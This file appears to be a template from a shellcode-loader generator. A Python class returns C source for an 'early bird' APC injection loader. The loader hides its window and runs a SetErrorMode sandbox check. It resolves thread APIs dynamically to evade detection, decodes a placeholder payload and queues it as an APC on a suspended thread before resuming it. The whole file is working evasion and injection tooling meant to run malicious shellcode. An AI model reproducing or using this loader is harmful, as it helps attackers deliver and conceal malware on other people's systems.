###"Technical principle: https://idiotc4t.com/code-and-dll-process-injection/early-bird"
from templates.template import *
class template(ITemplate):
    @staticmethod
    def get():
        c_code = '''
#include <stdio.h>
#include <windows.h>
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")	

typedef HANDLE (WINAPI* pCreateThread)(
	LPSECURITY_ATTRIBUTES   lpThreadAttributes,
	SIZE_T                  dwStackSize,
	LPTHREAD_START_ROUTINE  lpStartAddress,
	__drv_aliasesMem LPVOID lpParameter,
	DWORD                   dwCreationFlags,
	LPDWORD                 lpThreadId
);

typedef DWORD(WINAPI* pQueueUserAPC)(
	PAPCFUNC  pfnAPC,
	HANDLE    hThread,
	ULONG_PTR dwData
);

typedef DWORD (WINAPI* pResumeThread)(
	HANDLE hThread
);

<TABLES>

int main()
{

  DWORD dwCode ;
  dwCode = SetErrorMode(0x400);
  dwCode = SetErrorMode(0x0);
  if (dwCode != 0x400)
  {
    return 0;
  }

	PCHAR lpBuffer = <ALLOC>

    <DECODE>


	pCreateThread fCreateThread = (pCreateThread)GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateThread");
	pQueueUserAPC fQueueUserAPC = (pQueueUserAPC)GetProcAddress(GetModuleHandleA("kernel32.dll"), "QueueUserAPC");
	pResumeThread fResumeThread = (pResumeThread)GetProcAddress(GetModuleHandleA("kernel32.dll"), "ResumeThread");
	HANDLE hThread = fCreateThread(0, 0, (LPTHREAD_START_ROUTINE)0xff111f, 0, CREATE_SUSPENDED, NULL);

	fQueueUserAPC((PAPCFUNC)lpBuffer, hThread, 0);
	fResumeThread(hThread);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	return 0;
}
    '''
        return c_code

